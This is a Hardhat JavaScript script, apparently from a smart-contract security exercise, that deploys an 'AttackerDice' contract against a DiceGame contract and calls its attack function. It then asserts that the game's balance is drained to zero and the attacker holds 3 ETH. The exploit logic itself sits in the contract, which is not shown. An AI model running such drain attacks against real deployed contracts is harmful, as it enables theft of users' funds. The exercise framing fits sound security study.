// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
 
const { logtime } = require("./libraries/timelogger");
const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { parseEther } = require("ethers/lib/utils");
const { ethers } = require("hardhat");
const fs  = require("fs");

const diceGameContractAddress = fs.readFileSync('./temp_files/contract_address.txt', 'utf8');

async function diceAttack() { 
  const accounts = await ethers.getSigners();
  const contractOwner = accounts[0];

  logtime();

  const Attacker = await ethers.getContractFactory("AttackerDice");
  const attackerdice = await Attacker.deploy(diceGameContractAddress);
  await attackerdice.deployed()
  console.log("Bad contract deployed");
  
  console.log("Attacking contract at address: ", diceGameContractAddress);
  console.log(`DiceGame has ${ethers.utils.formatEther(await ethers.provider.getBalance(diceGameContractAddress))} ETH initially`);
  console.log(`AttackerDice has ${ethers.utils.formatEther(await ethers.provider.getBalance(attackerdice.address))} initially`);

  tx = await attackerdice.connect(contractOwner).attack();
  await tx.wait();

  console.log(`DiceGame has ${ethers.utils.formatEther(await ethers.provider.getBalance(diceGameContractAddress))} ETH now`);
  console.log(`AttackerDice has ${ethers.utils.formatEther(await ethers.provider.getBalance(attackerdice.address))} now`);
  
  console.log("Attack Executed");
  balanceETH = await ethers.provider.getBalance(diceGameContractAddress);
  expect(balanceETH).to.equal(BigNumber.from("0"));

  balanceETH = await ethers.provider.getBalance(attackerdice.address);
  expect(balanceETH).to.equal(parseEther("3"));
  logtime();
}
 
// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
diceAttack().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
exports.diceAttack = diceAttack;

